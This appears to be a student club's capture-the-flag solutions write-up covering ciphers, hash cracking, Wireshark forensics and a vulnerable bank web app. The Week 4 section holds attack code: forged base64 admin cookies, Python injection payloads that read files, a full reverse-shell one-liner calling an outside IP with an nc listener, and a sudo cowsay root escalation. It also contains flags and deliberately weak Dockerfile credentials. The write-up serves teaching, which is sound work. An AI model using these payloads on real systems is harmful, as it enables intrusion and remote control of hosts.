## Solutions:
---

### Week 0: Get To Know TechX

#### First Step:
- The TechX wifi is `roomUH111`

#### Library Check
- The book is `Kevin Mitnik`  

#### The Board
- This is morse code. It translates to `cyber`

#### Harder Cipher
- This is a pigpen cipher / masonic cipher. It decodes to `supersecurepassword` and made with [this website](https://www.dcode.fr/pigpen-cipher)

#### The Team
- Who *is* on the team???


---
### Week 1: The Mummy's Crypt of Cryptography

#### Back To Basics
- The flag is `notencryption`. Below is [cyberchef](https://gchq.github.io/CyberChef/) recipe to decode it. [Base64 Wiki](https://en.wikipedia.org/wiki/Base64)
- ![[../images/Pasted image 20211027131121.png]]

#### The Barnyard Cryptography
- [This cipher](https://en.wikipedia.org/wiki/Bacon%27s_cipher) using this [tool](https://www.dcode.fr/bacon-cipher). It decodes to `SPOOKYSEASON`.

#### The è in Encryption
- This cipher is a [Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher). To decode it, use something like cyberchef to get `techx_l@b_rules`
- ![[../images/Pasted image 20211027131800.png]]


#### Nuclear Codes
- This hash, `482c811da5d5b4bc6d497ffa98491e38`, is a MD5 hash. Use something like `john the ripper` or `hashcat` to crack it. Or use an online tool like [this](https://crackstation.net)
- ![[../images/Pasted image 20211027132644.png]]

#### The C_xor_nish Rex
- This one is wacky...
- ![[../images/Pasted image 20211027132847.png]]
- The intended way was to mess with cyberchef to get it, but it appears not a lot of people succeeded. Oops.
- ![[../images/Pasted image 20211027133523.png]]
- The flag is `#icanhazPDF?`
- More information on XOR cipher [here](https://en.wikipedia.org/wiki/XOR_cipher) and [here](https://www.101computing.net/xor-encryption-algorithm/)

---
### Week 2: Frankenstein's Forensics

#### Baby Shark Part One
This one requires opening the `pcap` in wireshark. You can see the protocol as one of the columns
![[../images/Pasted image 20211103140052.png]]
It is just `FTP`, not `TCP`. Oop if it is guessy

#### Baby Shark Part Two
This one requires filtering by `ftp` and then searching (using `Ctrl+F`) for the plaintext `user`. Another option is explored in part three.
![[../images/Pasted image 20211103140315.png]]

#### Baby Shark Part Three
This is the hard part. Filter by [FTP codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes) to find the one packet that authenticated. Now, the problem is how can you find the password that authenticated. To do that in wireshark you can follow [the tcp stream](https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowStreamSection.html) to find the right password.
![](https://lh5.googleusercontent.com/gaN1Lm8LVm1eMALyj0nhJYAinlOQegWu8M-YuWvBXXYEEpU2DDYAHynFGJI03v1PXCsXYzmrieOXTBzfxRz7PwhfCJdPB-Z4JXlaEX7-0xTapI2-9vQjwCQ1Je0XyXtAGCqpOfmH)
![[../images/Pasted image 20211103140755.png]]

#### Forensics Cat 
This cat works for the NSA. In order to solve it, you load a metadata viewer and get the latitude and longitude. I never fixed it so you are ever so slightly not in the NSA head quarters.
![[../images/Pasted image 20211103140910.png]]

#### A Window from Eons Ago!
This is a bad idea manifested into a challenge. It is a *Windows 95* image that has two microsoft paint images. One of which is exported to a `bmp` with the flag. How to get there? The easiest way is to use autopsy or a similar tool to dig through this image. However, what originally I had in mind was have it buried in a VirtualBox image and in order to get the flag you must *boot* Windows 95, read the registry dump stored on the Desktop, and look for recently modified microsoft paint files. 

---
### Week 3: Minotaur's Madly Miscellaneous Challenges

### Inspired Math Problem
Look up a write up for Project Euler 14 ([like this one](https://lucidmanager.org/data-science/project-euler-14/))

#### Nuclear Codes V2
This is a `sha256` that can be easily cracked using crackstation. It is just `powerzone`
![[../images/Pasted image 20211103141121.png]]

---
### Week 4: Bigfoot's Broken Bank App

##### Flag 1
- The first step is bad and guessy. You have to know about the web-application file `robots.txt`
- ![[../images/Pasted image 20211027163015.png]]
- That hint on the homepage was supposed you to read about it plus the hint I gave from the announcements
- ![[../images/Pasted image 20211027163121.png]]

#### Flag 2
- Goto `robots.txt` to get the next hidden layer, 
- ![[../images/Pasted image 20211027163224.png]]
- And be told you are not admin
- The *mean* way I had it before I removed it was there was a [TOTP code generator](https://en.wikipedia.org/wiki/Time-based_One-Time_Password) similar to that of Google Authenticator and you had to extract the valid TOTP secret key to make a valid cookie every 60 seconds
	- To derive the TOTP secret key, I would have hidden in the source code
- Instead, check the cookie
- ![[../images/Pasted image 20211027163556.png]]
- It is `base64`
- ![[../images/Pasted image 20211027163654.png]]
- Haha! change the b64 message to say you are admin
```python
        # sets cookie if blank
        if the_session_cookie == None:
            resp = make_response(render_template("forbidden.html"))
            resp.set_cookie('session', DEFAULT_COOKIE)

            return resp        
        
        # checks to see if admin
        else:
            session_cookie_json = base64.b64decode(the_session_cookie)
            session_cookie_dict = json.loads(session_cookie_json)

            if session_cookie_dict['admin'] == "False":
                resp = make_response(render_template("forbidden.html"))
            else:
                resp = make_response(render_template("secret.html"))
        return resp 
```
- How can you bypass this? set the cookie to equal anything besides `False` and then it will give you the next page
- ![[../images/Pasted image 20211027164006.png]]

#### Flag 3
- This is the point where difficulty shoots up because reasons
- The easiest way to get the `flag` from `flag.txt` is this one liner
```python
os.open("flag.txt","r").read()`
```
- How does this work? MaGiC 
- Another alternative is 
```python
__import__('subprocess').getoutput("cat flag.txt")
```
- Be warned: because it is a docker image that is running *one* python process (oversimplification) you can easily break the box if you run funny commands
	- One example is you can change the directory for all web-app users. Meaning, those who come after you trying to read the `flag.txt` will not be able to
	- (You can also just `rm -rf` the box. I do not know will happen. Please Don't?)
##### Flag 4
- The easiest way, pointed out by one user is to get this flag by giving the path is to read it with the previous step

```python
__import__('subprocess').getoutput("cat /home/www/user.txt")
```
- I gave the `shell.py` after realizing how difficult it would be to derive the intended shell method as shown below. (You also need a listener such as `nc -nvlp 4242`)

```python
exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("138.47.141.66",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")')
```
- To read more about how reverse shells work, here is a link [here](https://www.netsparker.com/blog/web-security/understanding-reverse-shells/). It is very important to understand for boot2root machines and offensive security in general.


##### Flag 5
In order to pivot to `gustave`, you find a password list with 101 passwords in the directory `/www/IMPORTANT_DIRECTORY_HIDING_FROM_WEBUSERS`. If you use `grep` against the file and look for `gustave`, you find the following snippet. All the other passwords are random words and probably will not be found in rockyou.txt.
```
gustave 7074598e8be40729e73a6a19ba3953f4
```
Run it through crackstation to find gustave's password is `MAHLOVE`. To swap users, use the following command
```bash
su - gustave
```
Then, navigate to `/home/gustave` to find the user.txt flag

#### Flag 6
The root is from `gtfo-bins`
https://gtfobins.github.io/gtfobins/cowsay/
If curious, here is how the users are set up
```dockerfile
RUN useradd -m gustave && echo "gustave:MAHLOVE" | chpasswd && adduser gustave sudo && chmod 750 /home/gustave

RUN echo "gustave ALL=(root) NOPASSWD: /usr/games/cowsay *" >> /etc/sudoers

# RUN useradd -m www/ && echo "www:www" | chpasswd

RUN echo "flag{ro0t-shell}" > /root/root.txt

  
  
  

## USER 1 - www 2 rootflag{l33t_h@ck3r_sk1lls}

RUN echo "flag{passwords_4_win}" > /home/gustave/user.txt

RUN useradd --shell /bin/rbash -m www && echo "www:www123" | chpasswd && chmod 750 /home/www

RUN echo "flag{1337_hacker}" > /home/www/user.txt

RUN mkdir /www/IMPORTANT_DIRECTORY_HIDING_FROM_WEBUSERS

RUN for i in $(seq 1 100 ) ; do WORD=$( cat /usr/share/dict/words | shuf -n 1 ) ; echo $WORD $( echo $WORD | md5sum | cut -c -32 ) >> /www/IMPORTANT_DIRECTORY_HIDING_FROM_WEBUSERS/passwords_important ; done

RUN echo "gustave 7074598e8be40729e73a6a19ba3953f4" > /www/IMPORTANT_DIRECTORY_HIDING_FROM_WEBUSERS/passwords_important

RUN for i in $(seq 1 100 ) ; do WORD=$( cat /usr/share/dict/words | shuf -n 1 ) ; echo $WORD $( echo $WORD | md5sum | cut -c -32 ) >> /www/IMPORTANT_DIRECTORY_HIDING_FROM_WEBUSERS/passwords_important ; done

USER www
```